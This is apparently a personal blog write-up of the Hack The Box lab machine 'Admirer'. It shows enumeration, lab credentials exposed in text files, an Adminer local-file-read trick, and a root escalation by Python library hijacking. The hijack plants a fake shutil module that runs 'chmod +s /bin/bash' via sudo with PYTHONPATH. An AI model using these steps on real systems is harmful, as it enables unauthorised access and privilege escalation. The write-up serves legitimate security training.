---
layout: post
category: writeup
---

## Machine Info

- Name: Admirer
- Description: Admirer is an easy difficulty Linux machine that features a vulnerable version of Adminer (caused by an underlying MySQL protocol flaw), and an interesting Python library hijacking vector. After thorough enumeration, lots of pieces of information can be combined to get a foothold and then escalate privileges to root.
- Difficulty: Easy

## Initial Access

Nmap:
```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Checking FTP yields no Anonymous access, so I'll move on!

![](assets/images/2024-01-29-HTB-admirer-writeup-image-1.png)

Website is an image gallery of some sort, I see in robots.txt that admin-dir exists, I'll route there and dirsearch at the same time!

Accessing the admin-dir head on shows me a 403, but dirsearching it finds the file `contacts.txt` and `credentials.txt`

```bash
HTB  dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u http://10.10.10.187/admin-dir

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, txt, html | HTTP method: GET | Threads: 64 | Wordlist size: 1102725

Output File: /home/kali/.dirsearch/reports/10.10.10.187/-admin-dir_24-01-29_10-26-12.txt

Error Log: /home/kali/.dirsearch/logs/errors-24-01-29_10-26-12.log

Target: http://10.10.10.187/admin-dir/

[10:26:12] Starting: 
[10:26:14] 200 -  350B  - /admin-dir/contacts.txt
[10:26:14] 200 -  350B  - /admin-dir/credentials.txt
```

```bash
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```

```bash
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

We also notice a domain `admirer.htb`, let's add that to our `/etc/hosts` file. 

I login to the ftp and download files present:

```bash
ftp> ls
229 Entering Extended Passive Mode (|||27824|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
226 Directory send OK.
ftp> get dump.sql
local: dump.sql remote: dump.sql
229 Entering Extended Passive Mode (|||27994|)
150 Opening BINARY mode data connection for dump.sql (3405 bytes).
100% |******************************************************************************************************************|  3405        2.65 MiB/s    00:00 ETA
226 Transfer complete.
3405 bytes received in 00:00 (64.25 KiB/s)
ftp> get html.tar.gz
local: html.tar.gz remote: html.tar.gz
229 Entering Extended Passive Mode (|||7100|)
150 Opening BINARY mode data connection for html.tar.gz (5270987 bytes).
100% |******************************************************************************************************************|  5147 KiB    1.40 MiB/s    00:00 ETA
226 Transfer complete.
5270987 bytes received in 00:03 (1.38 MiB/s)
ftp> 
```

Looking at the dump.sql I don't see anything that stands out, however, when I look at the html  tar file, I can see some important stuff!

For starters we have 2 directories I haven't seen before `utility-scripts` and `w4ld0s_s3cr3t_d1r`.

In waldos dir we can see more creds than before:
```bash
[Bank Account]
waldo.11
Ezy]m27}OREc$

[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

Looking through all the files in the utility-scripts section, I wasn't able to find much... so I tried accessing the pages from my browser, then hit it with a diresearch because the backup may be outdated..

Eventually we get a hit for adminer:

![](assets/images/2024-01-29-HTB-admirer-writeup-image-2.png)

I have tons of credentials, so let me see if I can login with any of them!

None of the credentials work, what we can try to do is the following:
- Setup a mysql server locally.
- Point Adminer at my machine
- Read local files!

![](assets/images/2024-01-29-HTB-admirer-writeup-image-3.png)

I login to my own instance!

Now I try to read local files, I attempted `/etc/passwd` to start with no luck! Now I'll try to do index.php:

![](assets/images/2024-01-29-HTB-admirer-writeup-image-4.png)

![](assets/images/2024-01-29-HTB-admirer-writeup-image-5.png)
![](assets/images/2024-01-29-HTB-admirer-writeup-image-6.png)

The password in index.php does not match the password that I have in my index.php, let's try it out on ssh!
```

HTB ssh waldo@admirer.htb
The authenticity of host 'admirer.htb (10.10.10.187)' can't be established.
ED25519 key fingerprint is SHA256:MfZJmYPldPPosZMdqhpjGPkT2fGNUn2vrEielbbFz/I.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:56: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'admirer.htb' (ED25519) to the list of known hosts.
waldo@admirer.htb's password: 
Linux admirer 4.9.0-19-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Thu Aug 24 16:09:42 2023 from 10.10.14.23
waldo@admirer:~$
```

We're in!
## Privilege Escalation

Checking sudo privileges:

```bash
waldo@admirer:/opt/scripts$ sudo -l
[sudo] password for waldo: 
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

I see that a script is running as root, and its running backup.py. This script imports shutil. Since I can set the environment, I can go ahead and set the Pythonpath to anything I want and put a fake python file called shutil with the function thats being imported!

```python
import os
def make_archive(test, test2, test3):
        os.system('chmod +s /bin/bash');

```

```bash
sudo PYTHONPATH=/dev/shm /opt/scripts/admin_tasks.sh 6
```

```bash
waldo@admirer:/dev/shm$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1099016 May 15  2017 /bin/bash
waldo@admirer:/dev/shm$ bash -p
bash-4.4# whoami
root
```

best,
gerbsec